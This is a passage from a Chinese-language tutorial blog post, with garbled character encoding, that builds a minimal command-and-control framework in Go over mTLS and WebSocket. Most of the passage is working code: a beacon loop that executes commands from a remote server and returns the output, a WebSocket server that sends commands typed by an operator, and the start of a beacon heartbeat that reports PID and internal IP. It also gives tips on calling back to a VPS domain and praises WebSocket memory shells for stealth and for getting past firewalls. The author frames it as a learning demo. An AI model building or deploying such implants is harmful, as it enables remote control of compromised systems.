</span><br><span class="line">       <span class="keyword">if</span> cmd == <span class="string">&quot;&quot;</span> &#123;  </span><br><span class="line">          <span class="keyword">continue</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 3. æ‰§è¡Œ  </span></span><br><span class="line">       <span class="keyword">var</span> out []<span class="type">byte</span>  </span><br><span class="line">       <span class="keyword">if</span> strings.Contains(cmd, <span class="string">&quot; &quot;</span>) &#123;  </span><br><span class="line">          <span class="comment">// å¸¦å‚æ•°  </span></span><br><span class="line">          parts := strings.Fields(cmd)  </span><br><span class="line">          out, _ = exec.Command(parts[<span class="number">0</span>], parts[<span class="number">1</span>:]...).CombinedOutput()  </span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">          out, _ = exec.Command(cmd).CombinedOutput()  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 4. å›ç»“æœï¼ˆé•¿åº¦å‰ç¼€å¸§ï¼‰  </span></span><br><span class="line">       <span class="keyword">if</span> err := utils.WriteFrame(conn, out); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          log.Printf(<span class="string">&quot;write: %v&quot;</span>, err)  </span><br><span class="line">          <span class="keyword">return</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>mTLS Beaconçš„é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œä¸»ä½“æ€è·¯å°±æ˜¯è¯»å–clientçš„ç§é’¥å’Œè¯ä¹¦ä»¥åŠCAçš„è¯ä¹¦ï¼Œé…ç½®å·TLSçš„é…ç½®ï¼Œä½¿ç”¨ <code>tls.Dial</code> å‘èµ·è¿æ¥ã€‚å¦‚æœè¿æ¥æˆåŠŸå°±ç»™serverå‘é€ä¸€ä¸ªmetaDataåŒ…ï¼Œè¡¨æ˜æˆ‘æ´»äº†ï¼Œä¹‹åè¿›å…¥å¾ªç¯ã€‚å¦‚æœserverä¸‹å‘å‘½ä»¤ï¼Œåˆ™å¯ä»¥ä»socketè¯»å–ï¼Œå¹¶å°†ç»“æœå†™å…¥socketï¼ŒåŒæ ·ç”¨åˆ°äº†å·¥å…·å‡½æ•°çš„ <code>ReadFrame</code> å’Œ <code>WriteFrame</code> ä»socketä¸­è¯»å†™æ•°æ®ã€‚</p>
<h2 id="2-3-æµé‡åˆ†æ"><a href="#2-3-æµé‡åˆ†æ" class="headerlink" title="2.3 æµé‡åˆ†æ"></a>2.3 æµé‡åˆ†æ</h2><p>å®ŒæˆTCPä¸‰æ¬¡æ¡æ‰‹ï¼Œæ¯•ç«ŸTLSä½¿ç”¨TCPæŠ¥æ–‡æ¥å°è£…ï¼Œä¹‹åå°±æ˜¯æœåŠ¡å™¨ä¼šæ ¹æ®SNIä¸­çš„ä¸»æœºåæ¥é€‰æ‹©ç›¸åº”çš„è¯ä¹¦å’Œå¯†é’¥ï¼Œä»¥å®ŒæˆTLSæ¡æ‰‹è¿‡ç¨‹ã€‚å…¶ä½™éƒ¨åˆ†å°±æ˜¯è¢«åŠ å¯†åçš„åº”ç”¨æ•°æ®ã€‚</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/13/21-57-37-b1c55b2bbffd6c818930e8f5364c3fcf-20250913215736-2da51d.png"></p>
<p>è¡¥å……ä¸€ä¸‹ï¼Œmtls beaconæ˜¯å¯ä»¥é€šè¿‡åŸŸåå»è®¿é—®åˆ°serverçš„ã€‚server.goçš„listenAddrä¿®æ”¹ä¸º0.0.0.0ï¼Œç«¯å£ä¿®æ”¹ä¸ºå¯ä»¥å‡º&#x2F;å…¥æµé‡çš„ç«¯å£ï¼Œè¿™ä¸ªè·Ÿvpsçš„å®‰å…¨ç»„ç­–ç•¥æœ‰å…³ã€‚</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/14/14-25-51-5e48a3df1733f862757ed15836e5673a-20250914142551-040eb1.png"></p>
<p>beacon.goçš„CallBackAddressä¿®æ”¹ä¸ºAè®°å½•åŸŸåï¼ˆæŒ‡å‘ä½ çš„vpså…¬ç½‘IPï¼‰ï¼Œæ³¨æ„è¦åˆ é™¤ <code>ServerName</code>ï¼Œä¸ç„¶clientéªŒè¯serverçš„è¯ä¹¦ä¼šå¤±è´¥ã€‚</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/14/14-24-17-54bf78c9b9c3b32f8cf6522670a9c92c-20250914142416-4df6bc.png"></p>
<p>è¿è¡Œbeaconï¼Œå¯ä»¥çœ‹åˆ°é¦–å…ˆæŸ¥è¯¢DNSæœåŠ¡å™¨Aè®°å½•åŸŸåæ‰€æŒ‡å‘çš„ipåœ°å€æ˜¯å¤šå°‘ï¼Œä¹Ÿå°±æ˜¯è¯¢é—®vpsçš„ipæ˜¯å¤šå°‘ã€‚</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/14/14-07-41-8bd72733ad079b0887786bf7a906939a-20250914140740-557e8a.png"></p>
<p>ä¹‹åå°±æ˜¯æ­£å¸¸çš„tcpä¸‰æ¬¡æ¡æ‰‹ï¼ˆå¤ªå¤štcpæŠ¥æ–‡äº†ï¼Œåˆ†ä¸æ¸…ï¼‰ï¼ŒéªŒè¯è¯ä¹¦ä¸äº¤æ¢å¯†é’¥ï¼Œä»¥å®ŒæˆTLSæ¡æ‰‹è¿‡ç¨‹ã€‚</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/14/14-11-31-5d23a166106825908981bfe68f9daad1-20250914141131-542796.png"></p>
<p>èƒ½å¤Ÿæ­£å¸¸æ‰§è¡Œå‘½ä»¤ä¸å›ä¼ ç»“æœã€‚</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/14/14-29-13-2ca62408e79312aaedf1ca707820d645-20250914142912-f5cbaa.png"></p>
<h1 id="ä¸‰ã€WebSocket"><a href="#ä¸‰ã€WebSocket" class="headerlink" title="ä¸‰ã€WebSocket"></a>ä¸‰ã€WebSocket</h1><h2 id="3-1-æ€è·¯æ„å»º"><a href="#3-1-æ€è·¯æ„å»º" class="headerlink" title="3.1 æ€è·¯æ„å»º"></a>3.1 æ€è·¯æ„å»º</h2><p>WebSocketæ˜¯ä¸€ç§å…¨åŒå·¥é€šä¿¡åè®®ï¼Œå³å®¢æˆ·ç«¯å¯ä»¥å‘æœåŠ¡ç«¯å‘é€è¯·æ±‚ï¼ŒæœåŠ¡ç«¯ä¹Ÿå¯ä»¥ä¸»åŠ¨å‘å®¢æˆ·ç«¯ï¼Œä¸»è¦åº”ç”¨æœ‰å®æ—¶æ€§è¦æ±‚çš„è½¯ä»¶æ¯”å¦‚è¯´wxã€QQç­‰ã€‚åœ¨å®‰å…¨é¢†åŸŸä¸­ï¼Œç‰¹åˆ«æ˜¯æœ€è¿‘å‡ å¹´å‡ºç°äº†ä¸€ç§æ–°å‹çš„å†…å­˜é©¬-WebSocketå†…å­˜é©¬ï¼Œ<strong>å› å…¶é«˜éšè”½æ€§ï¼ˆé€šè¿‡HTTP&#x2F;HTTPSå»ºç«‹è¿æ¥ï¼‰ã€åŒå‘é€šä¿¡ã€æ˜“äºæ··æ·†ï¼ˆå¯æ··æ·†uriï¼Œä¼ªé€ æˆæ­£å¸¸å®æ—¶é€šä¿¡åº”ç”¨ï¼‰</strong>ï¼Œè€Œé€æ¸ç››è¡Œï¼Œæ‰€ä»¥æˆ‘å°±è·Ÿé£ç ”ç©¶ä¸€ä¸‹é€šä¿¡åŸç†å¹¶ç®€å•å®ç°ä¸€ä¸ªdemoã€‚</p>
<p>WebSocketä½œä¸ºé€šä¿¡åè®®é€šè¿‡ <strong>HTTP 80&#x2F;443ç«¯å£å®Œæˆæ¡æ‰‹ï¼ˆè¿™é‡Œçš„ç«¯å£éƒ½æ˜¯æŒ‡serverï¼‰</strong>ï¼Œéšåæµé‡å˜ä¸º <strong>äºŒè¿›åˆ¶å¸§</strong>ï¼Œèƒ½å¤Ÿæœ‰æ•ˆçš„çªç ´é˜²ç«å¢™é™åˆ¶ï¼Œå»ºç«‹ç¨³å®šçš„é€šä¿¡ä¿¡é“ã€‚</p>
<p>å¾ˆå¤šè¯­è¨€éƒ½å®ç°äº†WebSocketåè®®ï¼Œæœ¬äººåˆä¼šä¸€ç‚¹ç‚¹goè¯­è¨€ï¼Œæ‰€ä»¥ä»£ç é‡‡ç”¨Goçš„ <code>github.com/gorilla/websocket</code> åŒ…æ¥å®ç°ã€‚</p>
<p>WebSocketåè®®æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªåŸºäºTCPçš„åè®®ï¼Œå®ƒçš„<strong>å»ºç«‹è¿‡ç¨‹</strong>å¦‚ä¸‹ï¼š</p>
<ol>
<li>å®¢æˆ·ç«¯ï¼ˆä¸€èˆ¬æ˜¯æµè§ˆå™¨ï¼‰é¦–å…ˆå‘æœåŠ¡å™¨å‘é€HTTP GETè¯·æ±‚ï¼Œè¯·æ±‚å¤´ä¸æ™®é€šçš„HTTPè¯·æ±‚å¤´ä¸åŒï¼Œéœ€è¦é™„åŠ ä¿¡æ¯â€Upgrade: WebSocketâ€è¡¨æ˜è¿™æ˜¯ä¸€ä¸ªç”³è¯·åè®®å‡çº§çš„HTTPè¯·æ±‚</li>
<li>æœåŠ¡å™¨è§£æè¯·æ±‚å¤´ï¼ŒçŸ¥é“æ˜¯è¦å»ºç«‹Websocketï¼Œè¿”å›åº”ç­”ä¿¡æ¯ç»™å®¢æˆ·ç«¯</li>
<li>ä¹‹åå°±æ˜¯å»ºç«‹äº†WebSocketè¿æ¥ï¼ŒåŒæ–¹é€šè¿‡è¿™ä¸ªä¿¡é“ä¼ è¾“æ•°æ®ï¼Œç›´åˆ°æŸä¸€æ–¹ä¸»åŠ¨å…³é—­è¿æ¥ã€‚</li>
</ol>
<p><strong>WebSocketéœ€è¦å®ç°é•¿åº¦å‰ç¼€é˜²æ­¢ç²˜åŒ…å—</strong>ï¼Ÿå…¶å®å¹¶ä¸éœ€è¦ï¼ŒWebSocketåè®®è‡ªèº«å·²ç»å†…ç½®äº†å®Œå–„çš„å¸§æœºåˆ¶ï¼Œå®ƒç”¨è‡ªå·±çš„æ–¹å¼è§£å†³äº†â€œç²˜åŒ…â€é—®é¢˜ï¼Œå› æ­¤åœ¨å…¶ä¹‹ä¸Šåº”ç”¨å±‚çš„å¼€å‘è€…ä¸éœ€è¦å†é¢å¤–å®ç°ä¸€å¥—é•¿åº¦å‰ç¼€çš„é€»è¾‘ï¼Œè¿™ä¸€åˆ‡å¯¹å¼€å‘è€…æ¥è¯´å®Œå…¨é€æ˜ï¼Œæ— éœ€å…³å¿ƒã€‚</p>
<p>è¯´å®è¯Websocketçš„æ€è·¯æ„å»ºä¸ä¸Šé¢çš„mTLSç±»ä¼¼ï¼Œæˆ‘å°±ä¸åœ¨è¿™é‡Œè¿‡å¤šèµ˜è¿°äº†ã€‚</p>
<h2 id="3-2-ä»£ç å®ç°"><a href="#3-2-ä»£ç å®ç°" class="headerlink" title="3.2 ä»£ç å®ç°"></a>3.2 ä»£ç å®ç°</h2><h3 id="3-2-1-server"><a href="#3-2-1-server" class="headerlink" title="3.2.1 server"></a>3.2.1 server</h3><p>å®šä¹‰ä¸€ä¸ªå…¨å±€å‡çº§å™¨ <code>Upgrader</code> è´Ÿè´£æŠŠæ™®é€šHTTPè¿æ¥å‡çº§æˆWebSocketï¼Œä¸»è¦ä¾æ®HTTPä¸­è¯·æ±‚å¤´æ˜¯å¦æœ‰ <code>Connection: Upgrade</code> + <code>Upgrade: websocket</code>ã€‚</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*  å…¨å±€å‡çº§å™¨  */</span></span><br><span class="line"><span class="keyword">var</span> upgrader = websocket.Upgrader&#123;  </span><br><span class="line">    CheckOrigin: <span class="function"><span class="keyword">func</span><span class="params">(r *http.Request)</span></span> <span class="type">bool</span> &#123; <span class="keyword">return</span> <span class="literal">true</span> &#125;,  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> (  </span><br><span class="line">    HOST = <span class="string">&quot;192.168.3.1&quot;</span>  </span><br><span class="line">    PORT = <span class="string">&quot;8080&quot;</span>  </span><br><span class="line">)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;  </span><br><span class="line">    srv, err := ListenerStart(fmt.Sprintf(<span class="string">&quot;%s:%s&quot;</span>, HOST, PORT))  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       log.Fatal(err)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// ä¼˜é›…é€€å‡º  </span></span><br><span class="line">    sig := <span class="built_in">make</span>(<span class="keyword">chan</span> os.Signal, <span class="number">1</span>)  </span><br><span class="line">    signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)  </span><br><span class="line">    &lt;-sig  </span><br><span class="line">  </span><br><span class="line">    log.Println(<span class="string">&quot;shutting down...&quot;</span>)  </span><br><span class="line">    srv.Close()  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<p><strong>ListenerStart</strong>ï¼šæ—¢ç„¶WebSocketæ˜¯ä»æ™®é€šçš„HTTPè¿æ¥å‡çº§è€Œæ¥ï¼Œé‚£å¿…å®šéœ€è¦å¯åŠ¨ä¸€ä¸ªHTTPæœåŠ¡å™¨ï¼Œåœ¨è¿™é‡Œä¸å†éœ€è¦Ginæ¡†æ¶æ¥å¼„å‡ºä¸ªHTTPæœåŠ¡å™¨ï¼Œç›´æ¥ä½¿ç”¨ <code>net/http</code> åŒ…ç®€å•çš„å¼„ä¸ªHTTPæœåŠ¡å™¨å°±å¯ä»¥äº†ï¼Œå°†å‡çº§æœåŠ¡çš„uriå®šä¹‰ä¸º <code>/ws</code>ï¼Œè¿™ä¸ªè·¯å¾„ä¹Ÿæ˜¯å¯ä»¥æ¢æˆå…¶ä»–çš„ï¼Œç„¶åå¯¹è¿™ä¸ªè·¯å¾„çš„è¯·æ±‚äº¤ç”± <code>acceptConnections</code> å¤„ç†ã€‚</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ListenerStart å¯åŠ¨ HTTPç›‘å¬å™¨  </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ListenerStart</span><span class="params">(addr <span class="type">string</span>)</span></span> (*http.Server, <span class="type">error</span>) &#123;  </span><br><span class="line">    mux := http.NewServeMux()  </span><br><span class="line">    mux.HandleFunc(<span class="string">&quot;/ws&quot;</span>, acceptConnections) <span class="comment">// æŠŠ WS å‡çº§è·¯å¾„æŒ‚è¿›å»  </span></span><br><span class="line">  </span><br><span class="line">    srv := &amp;http.Server&#123;Addr: addr, Handler: mux&#125;  </span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;  </span><br><span class="line">       <span class="keyword">if</span> err := srv.ListenAndServe(); err != <span class="literal">nil</span> &amp;&amp; err != http.ErrServerClosed &#123;  </span><br><span class="line">          log.Fatalf(<span class="string">&quot;listen: %v&quot;</span>, err)  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;()  </span><br><span class="line">    log.Println(<span class="string">&quot;websocket listener started on&quot;</span>, addr)  </span><br><span class="line">    <span class="keyword">return</span> srv, <span class="literal">nil</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>acceptConnections</strong>ï¼šç”¨å…¨å±€å‡çº§å™¨ <code>Upgrader</code> å°†HTTPå‡çº§åˆ°WebSocketåï¼ŒæŠŠ <code>conn</code> è¿æ¥äº¤ç»™ <code>handleConnection</code> å¤„ç†ä¸šåŠ¡é€»è¾‘</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// acceptConnections HTTPå‡çº§åˆ°WSåï¼ŒæŠŠè¿æ¥äº¤ç»™handleConnection  </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">acceptConnections</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;  </span><br><span class="line">    conn, err := upgrader.Upgrade(w, r, <span class="literal">nil</span>)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       log.Printf(<span class="string">&quot;upgrade: %v&quot;</span>, err)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">    log.Printf(<span class="string">&quot;new websocket %v&quot;</span>, conn.RemoteAddr())  </span><br><span class="line">    <span class="comment">// ä¸€æ¡ goroutine å¯¹åº”ä¸€æ¡ WS è¿æ¥  </span></span><br><span class="line">    <span class="keyword">go</span> handleConnection(conn)  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><strong>handleConnection</strong>ï¼šè¿™é‡Œä¸»è¦å®ç°ä¸šåŠ¡ç›¸å…³çš„é€»è¾‘ï¼Œå¾ˆç®€å•å°±æ˜¯ä½¿ç”¨ <code>conn.ReadMessage</code> ä»è¿æ¥ä¸­è¯»å–å¿ƒè·³åŒ…ï¼Œç„¶åç›´æ¥æ‰“å°è¾“å‡ºã€‚</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯è¿›å…¥ä¸»å¾ªç¯ï¼š</p>
<ol>
<li>ä»æ ‡å‡†å‡ºå…¥ä¸­è¯»å–å‘½ä»¤ï¼Œå¹¶ç”¨ <code>conn.WriteMessage(websocket.TextMessage, []byte(cmdLine))</code> å†™å…¥åˆ°è¿æ¥ä¸­ï¼Œå…¶ä¸­ <code>websocket.TextMessage</code> æ¶ˆæ¯ç±»å‹å¸¸é‡ï¼Œå®ƒçš„ä½œç”¨å°±æ˜¯æŒ‰ä»€ä¹ˆæ–¹å¼å»å¤„ç†æ•°æ®ï¼Œæ¯”å¦‚è¯´ <code>conn.WriteMessage(websocket.TextMessage, []byte(data))</code> å°±æ˜¯æŒ‰æ–‡æœ¬çš„æ–¹å¼å»å†™å…¥æ•°æ®åˆ°è¿æ¥ä¸­ã€‚</li>
<li>æ¥ä¸‹æ¥å°±æ˜¯ä½¿ç”¨ <code>conn.ReadMessage</code> è¯»å–å›æ˜¾ï¼Œå¦‚æœBeaconä¸ä½¿ç”¨ <code>conn.WriteMessage</code> å‘é€æ•°æ®ï¼Œåˆ™serverä¼šé˜»å¡åœ¨è¿™é‡Œ</li>
<li>ç»“æœç›´æ¥æ‰“å°è¾“å‡ºï¼Œæ²¡å•¥å¥½è¯´çš„ã€‚</li>
</ol>
<p>è¡¥å……æ¶ˆæ¯ç±»å‹ï¼š</p>
<table>
<thead>
<tr>
<th>ç¬¦å·å¸¸é‡</th>
<th>æ•°å€¼</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td><code>websocket.TextMessage</code></td>
<td>1</td>
<td>UTF-8 æ–‡æœ¬å¸§</td>
</tr>
<tr>
<td><code>websocket.BinaryMessage</code></td>
<td>2</td>
<td>äºŒè¿›åˆ¶å¸§</td>
</tr>
<tr>
<td><code>websocket.CloseMessage</code></td>
<td>8</td>
<td>å…³é—­å¸§ï¼ˆå¸¦çŠ¶æ€ç ï¼‰</td>
</tr>
<tr>
<td><code>websocket.PingMessage</code></td>
<td>9</td>
<td>å¿ƒè·³ Ping</td>
</tr>
<tr>
<td><code>websocket.PongMessage</code></td>
<td>10</td>
<td>å¿ƒè·³ Pong</td>
</tr>
</tbody></table>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// handleConnection ä»socketä¸­è¯»å†™æ•°æ®  </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handleConnection</span><span class="params">(conn *websocket.Conn)</span></span> &#123;  </span><br><span class="line">    <span class="keyword">defer</span> conn.Close()  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// å¿ƒè·³åŒ…  </span></span><br><span class="line">    _, online, _ := conn.ReadMessage()  </span><br><span class="line">    log.Printf(<span class="string">&quot;online: %s&quot;</span>, online)  </span><br><span class="line">    conn.WriteMessage(websocket.TextMessage, []<span class="type">byte</span>(<span class="string">&quot;server ok&quot;</span>))  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> &#123;  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// ä»æ ‡å‡†è¾“å…¥ä¸­è¯»å–å‘½ä»¤  </span></span><br><span class="line">       fmt.Print(<span class="string">&quot;Cmd&gt;&gt;&gt; &quot;</span>)  </span><br><span class="line">       cmdLine, _ := bufio.NewReader(os.Stdin).ReadString(<span class="string">&#x27;\n&#x27;</span>)  </span><br><span class="line">       cmdLine = strings.TrimRight(cmdLine, <span class="string">&quot;\r\n&quot;</span>)  </span><br><span class="line">       <span class="keyword">if</span> cmdLine == <span class="string">&quot;&quot;</span> &#123;  </span><br><span class="line">          <span class="keyword">continue</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// ä¸‹å‘å‘½ä»¤  </span></span><br><span class="line">       <span class="keyword">if</span> err := conn.WriteMessage(websocket.TextMessage, []<span class="type">byte</span>(cmdLine)); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          <span class="keyword">break</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// è¯»å–å›æ˜¾  </span></span><br><span class="line">       _, msg, err := conn.ReadMessage()  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// ç”¨æ¥åŒºåˆ†æ­£å¸¸å…³é—­è¿˜æ˜¯å¼‚å¸¸æ–­å¼€ã€‚  </span></span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          <span class="keyword">if</span> websocket.IsUnexpectedCloseError(err,  </span><br><span class="line">             websocket.CloseGoingAway, websocket.CloseNormalClosure) &#123;  </span><br><span class="line">             log.Printf(<span class="string">&quot;abnormal close: %v&quot;</span>, err)  </span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">             log.Println(<span class="string">&quot;client closed&quot;</span>)  </span><br><span class="line">          &#125;  </span><br><span class="line">          <span class="keyword">break</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// è¾“å‡ºä»»åŠ¡æ•°æ®  </span></span><br><span class="line">       log.Printf(<span class="string">&quot;output: %s\n&quot;</span>, <span class="type">string</span>(msg))  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-2-2-beacon"><a href="#3-2-2-beacon" class="headerlink" title="3.2.2 beacon"></a>3.2.2 beacon</h3><p>ä»£ç å…¶å®æ²¡å•¥å¥½è¯´çš„ï¼Œå…¶å®æœ¬æ–‡ä¸­çš„æ‰€æœ‰ä»£ç ç¤ºä¾‹éƒ½å±äºç®€å•æ˜äº†ï¼Œåªä¸ºçœ‹æ¸…æ•°æ®ä¹‹é—´çš„ä¼ è¾“ã€‚</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;bytes&quot;</span>  </span><br><span class="line">    <span class="string">&quot;encoding/json&quot;</span>    </span><br><span class="line">    <span class="string">&quot;github.com/gorilla/websocket&quot;</span>    </span><br><span class="line">    <span class="string">&quot;io&quot;</span>    </span><br><span class="line">    <span class="string">&quot;log&quot;</span>    </span><br><span class="line">    <span class="string">&quot;math/rand/v2&quot;</span>    </span><br><span class="line">    <span class="string">&quot;net/url&quot;</span>    </span><br><span class="line">    <span class="string">&quot;os&quot;</span>    </span><br><span class="line">    <span class="string">&quot;os/exec&quot;</span>    </span><br><span class="line">    <span class="string">&quot;websocket/utils&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> BeaconConfig <span class="keyword">struct</span> &#123;  </span><br><span class="line">    Sleep           <span class="type">int32</span>  </span><br><span class="line">    Jitter          <span class="type">int32</span>  </span><br><span class="line">    CallBackAddress <span class="type">string</span>  </span><br><span class="line">    URI             <span class="type">string</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> HeartBeat <span class="keyword">struct</span> &#123;  </span><br><span class="line">    BeaconId    <span class="type">int32</span>  <span class="string">`json:&quot;beacon_id&quot;`</span>  </span><br><span class="line">    Sleep       <span class="type">int32</span>  <span class="string">`json:&quot;sleep&quot;`</span>  </span><br><span class="line">    Jitter      <span class="type">int32</span>  <span class="string">`json:&quot;jitter&quot;`</span>  </span><br><span class="line">    PID         <span class="type">int32</span>  <span class="string">`json:&quot;pid&quot;`</span>  </span><br><span class="line">    ACP         <span class="type">int32</span>  <span class="string">`json:&quot;acp&quot;`</span>  </span><br><span class="line">    InternalIP  <span class="type">int32</span>  <span class="string">`json:&quot;internal_ip&quot;`</span>  